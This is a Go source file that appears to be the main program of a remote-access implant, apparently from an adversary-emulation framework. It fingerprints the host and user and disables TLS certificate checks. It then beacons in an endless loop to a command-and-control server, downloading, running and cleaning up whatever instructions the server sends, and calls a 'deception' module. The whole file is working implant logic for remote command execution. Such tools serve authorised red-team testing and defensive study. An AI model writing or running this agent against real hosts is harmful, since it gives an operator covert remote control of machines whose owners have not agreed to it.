package main

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"os"
	"os/user"
	"time"
	"reflect"
	"./api"
	"./cleanup"
	"./deception"
	"./util"
)

var iteration = 60

func runBeaconIteration(server string, paw string, group string, files string) {
	fmt.Println("[+] Beacon firing")
	commands := api.Beacon(server, paw, group, files)
	if commands != nil && len(commands.([]interface{})) > 0 {
		cmds := reflect.ValueOf(commands)
		for i := 0; i < cmds.Len(); i++ {
			cmd := cmds.Index(i).Elem().String()
			fmt.Println("[+] Running instruction")
			command := util.Unpack([]byte(cmd))
			api.Drop(server, files, command)
			api.Results(server, paw, command)
			cleanup.Apply(command)
		}
	} else {
		cleanup.Run(files)
		time.Sleep(time.Duration(iteration) * time.Second)
	}
}

func runAutonomousIteration(server string, paw string, group string, files string) {
    fmt.Println("[+] Autonomous iteration running")
    time.Sleep(time.Duration(iteration) * time.Second)
}

func main() {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	host, _ := os.Hostname()
	user, _ := user.Current()
	paw := fmt.Sprintf("%s$%s", host, user.Username)
	files := os.TempDir()
	server := "http://localhost:8888"
	group := "my_group"

	if len(os.Args) == 3 {
		server = os.Args[1]
		group = os.Args[2]	
	}

	deception.Log()
	for {
		runBeaconIteration(server, paw, group, files)
	}
}
